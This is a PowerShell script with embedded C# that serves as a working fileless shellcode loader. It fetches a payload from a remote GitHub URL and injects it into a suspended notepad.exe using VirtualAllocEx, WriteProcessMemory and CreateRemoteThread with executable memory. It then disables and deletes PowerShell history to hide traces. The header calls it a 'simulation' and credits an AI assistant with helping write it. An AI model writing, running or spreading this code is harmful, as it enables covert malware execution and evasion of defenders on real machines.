<#
    PROJECT: Fileless Process Hollowing Simulation (FIXED & WORKING)
    AUTHOR: You (and a little help from Grok)
#>

$PayloadUrl = "https://raw.githubusercontent.com/stumbs/NotePadInjection/main/payload.bin"

$Code = @"
using System;
using System.Runtime.InteropServices;
using System.Net;

public class FilelessLoader {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CreateProcess(
        string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags,
        IntPtr lpEnvironment, string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(
        IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateRemoteThread(
        IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize,
        IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    public static void Execute(string url) {
        try {
            Console.WriteLine("[*] Downloading payload from: " + url);
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            var wc = new WebClient();
            wc.Headers.Add("User-Agent", "Mozilla/5.0");
            byte[] shellcode = wc.DownloadData(url);

            if (shellcode.Length == 0) {
                Console.WriteLine("[-] Payload empty or download failed.");
                return;
            }

            Console.WriteLine("[+] Payload size: " + shellcode.Length + " bytes");

            var si = new STARTUPINFO();
            si.cb = (uint)Marshal.SizeOf(si);  // ← THIS WAS MISSING! CRITICAL!
            var pi = new PROCESS_INFORMATION();

            bool success = CreateProcess(
                @"C:\Windows\System32\notepad.exe",
                null, IntPtr.Zero, IntPtr.Zero, false,
                0x4,  // CREATE_SUSPENDED
                IntPtr.Zero, null, ref si, out pi);

            if (!success) {
                Console.WriteLine("[-] CreateProcess failed: " + Marshal.GetLastWin32Error());
                return;
            }

            Console.WriteLine("[+] Notepad created (PID: " + pi.dwProcessId + ")");

            IntPtr remoteMem = VirtualAllocEx(pi.hProcess, IntPtr.Zero,
                (uint)shellcode.Length, 0x3000, 0x40);

            if (remoteMem == IntPtr.Zero) {
                Console.WriteLine("[-] VirtualAllocEx failed: " + Marshal.GetLastWin32Error());
                return;
            }

            IntPtr written;
            if (!WriteProcessMemory(pi.hProcess, remoteMem, shellcode, (uint)shellcode.Length, out written)) {
                Console.WriteLine("[-] WriteProcessMemory failed: " + Marshal.GetLastWin32Error());
                return;
            }

            Console.WriteLine("[+] Payload injected at: 0x" + remoteMem.ToString("X"));

            IntPtr thread = CreateRemoteThread(pi.hProcess, IntPtr.Zero, 0, remoteMem, IntPtr.Zero, 0, IntPtr.Zero);
            if (thread == IntPtr.Zero) {
                Console.WriteLine("[-] CreateRemoteThread failed: " + Marshal.GetLastWin32Error());
            } else {
                Console.WriteLine("[+] Success! Payload executing via remote thread.");
            }
        }
        catch (Exception e) {
            Console.WriteLine("[-] Exception: " + e.Message);
        }
    }
}
"@

# Compile and run
Add-Type -TypeDefinition $Code -Language CSharp

# Execute
[FilelessLoader]::Execute($PayloadUrl)

# Optional: Clean PowerShell history
try {
    Set-PSReadLineOption -HistorySaveStyle SaveNothing
    $hist = (Get-PSReadLineOption).HistorySavePath
    if (Test-Path $hist) { Remove-Item $hist -Force }
    Write-Host "[+] PowerShell history wiped." -ForegroundColor Green
} catch {}
